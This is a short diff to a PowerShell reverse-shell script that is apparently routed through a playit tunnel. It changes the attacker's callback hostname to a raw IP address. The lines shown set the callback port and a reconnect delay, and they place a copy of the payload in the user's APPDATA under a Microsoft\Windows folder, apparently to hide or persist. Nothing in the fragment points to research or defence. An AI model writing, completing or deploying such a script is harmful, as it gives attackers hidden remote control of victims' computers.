@@ -1,5 +1,5 @@
 # reverse_shell.ps1 - EXACTLY FOR YOUR PLAYIT TUNNEL
-$playitAddress = "license-employee.gl.at.ply.gg"  # YOUR EXACT ADDRESS
+$playitAddress = "147.185.221.31"  # YOUR EXACT ADDRESS
 $playitPort = 47034  # YOUR EXACT PORT
 $reconnectDelay = 15  # Seconds to wait before reconnecting
 $localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
